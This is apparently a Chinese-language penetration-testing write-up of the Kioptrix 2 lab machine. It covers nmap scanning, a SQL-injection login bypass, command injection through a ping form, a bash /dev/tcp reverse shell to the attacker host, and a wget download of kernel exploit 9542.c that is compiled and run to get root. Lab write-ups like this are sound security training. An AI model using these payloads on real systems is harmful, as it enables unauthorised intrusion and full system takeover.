# 信息搜集

1、端口存活探测

```bash
┌──(root💀kali)-[~]
└─#  nmap 192.168.0.102 -p- -min-rate 8888 -r -PN -sS -oA kioptrix2/port-scan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 02:17 EDT
Nmap scan report for 192.168.0.102 (192.168.0.102)
Host is up (0.0021s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
1010/tcp open  surf
3306/tcp open  mysql
MAC Address: 00:0C:29:9D:B7:E0 (VMware)
```

2、提取端口

```bash
└─# cat port-scan.nmap | grep open | awk -F '/' '{print $1}' | tr '\n' ','
22,80,111,443,631,1010,3306,                    
```

3、详细端口扫描

```bash
└─# nmap 192.168.0.102 -p 22,80,111,443,631,1010,3306 -sV -sC -O  --version-all -oA server-info
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 02:20 EDT
Nmap scan report for 192.168.0.102 (192.168.0.102)
Host is up (0.00047s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f3e8b1e5863fecf27a318093b52cf72 (RSA1)
|   1024 346b453dbacecab25355ef1e43703836 (DSA)
|_  1024 684d8cbbb65abd7971b87147ea004261 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1007/udp   status
|_  100024  1           1010/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_ssl-date: 2023-06-17T03:11:03+00:00; -3h09m34s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_http-server-header: Apache/2.0.52 (CentOS)
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
1010/tcp open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:9D:B7:E0 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
```

4、使用nmap默认漏洞扫描

```bash
└─# nmap 192.168.0.102 -p 22,80,111,443,631,1010,3306 --script=vuln -oA server-vuln
```

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.0.102
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.0.102:80/
|     Form id: frmlogin
|     Form action: index.php
|     
|     Path: http://192.168.0.102:80/index.php
|     Form id: frmlogin
|_    Form action: index.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /icons/: Potentially interesting directory w/ listing on 'apache/2.0.52 (centos)'
|_  /manual/: Potentially interesting folder
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
111/tcp  open  rpcbind
443/tcp  open  https
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
| ssl-dh-params: 
|   VULNERABLE:
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-4000  BID:74733
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|       https://www.securityfocus.com/bid/74733
|       https://weakdh.org
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.0.102
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: https://192.168.0.102:443/
|     Form id: frmlogin
|     Form action: index.php
|     
|     Path: https://192.168.0.102:443/index.php
|     Form id: frmlogin
|_    Form action: index.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /icons/: Potentially interesting directory w/ listing on 'apache/2.0.52 (centos)'
|_  /manual/: Potentially interesting folder
631/tcp  open  ipp
1010/tcp open  surf
3306/tcp open  mysql
MAC Address: 00:0C:29:9D:B7:E0 (VMware)
```



# web打点

对80端口下手

<img src=".\图片\Snipaste_2023-06-17_14-24-36.png" alt="Snipaste_2023-06-17_14-24-36" style="zoom:67%;" />

由于知道数据库为mysql，试试万能密码 `admin' or '1'='1`

发现 ping 命令执行的点

<img src=".\图片\Snipaste_2023-06-17_14-26-00.png" alt="Snipaste_2023-06-17_14-26-00" style="zoom:80%;" />

输入 `;whoami` 显示为 apache

<img src=".\图片\Snipaste_2023-06-17_14-27-40.png" alt="Snipaste_2023-06-17_14-27-40" style="zoom:67%;" />

反弹 shell

```
;bash -version
GNU bash, version 3.00.15(1)-release (i686-redhat-linux-gnu)
Copyright (C) 2004 Free Software Foundation, Inc.
```

```
;bash -i >& /dev/tcp/192.168.0.103/1234 0>&1
```

kali 执行 `nc -lvvp 1234`

<img src=".\图片\Snipaste_2023-06-17_14-32-00.png" alt="Snipaste_2023-06-17_14-32-00" style="zoom:67%;" />

# 内核提权

```
searchsploit kernel 2.6 centos
```

步骤概括为：搜索当前主机的内核版本，寻找 exp

<img src=".\图片\Snipaste_2023-06-17_14-39-59.png" alt="Snipaste_2023-06-17_14-39-59" style="zoom:80%;" />

随便用一个 9542.c

kali 开启 http 服务，让靶机下载 9542.c ，靶机在编译运行即可

```bash
bash-3.00$ wget http://192.168.0.103:6666/9542.c

--23:40:03--  http://192.168.0.103:6666/9542.c
           => `9542.c'
Connecting to 192.168.0.103:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,535 (2.5K) [text/x-csrc]

    0K ..                                                    100%  219.78 MB/s

23:40:03 (219.78 MB/s) - `9542.c' saved [2535/2535]

bash-3.00$ ls
9542.c

bash-3.00$ gcc -o 9542 9542.c
9542.c:109:28: warning: no newline at end of file

bash-3.00$ ./9542
sh: no job control in this shell

sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
```


